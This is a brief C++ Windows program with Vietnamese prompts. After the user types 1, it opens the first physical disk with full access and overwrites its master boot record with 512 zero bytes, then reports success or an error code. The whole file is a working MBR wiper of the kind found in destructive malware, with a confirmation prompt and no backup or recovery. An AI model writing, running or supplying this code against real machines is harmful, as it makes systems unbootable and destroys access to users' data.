#include <iostream>
#include <Windows.h>

using namespace std;

#define MBR_SIZE 512

int main()
{
    std::cout << "Hello World, ghi de mbr!\n";
    DWORD write;
    char mbrData[MBR_SIZE];
    std::cout << "Nhap 1 de chay\n";
    int n;
    cin >> n;
    if (n == 1)
    {
        ZeroMemory(&mbrData, sizeof(mbrData));
        HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
        if (WriteFile(MBR, mbrData, MBR_SIZE, &write, NULL))
        {
            std::cout << "Ghi de duoc\n";

        }
        else {
            std::cout << "Bip roi khong ghi duoc dau, error = "<<GetLastError()<<std::endl;
        }
    }
    else
    {
        cout << "Khong chay ghi de mbr\n";
    }
    system("pause");
    return 0;

}
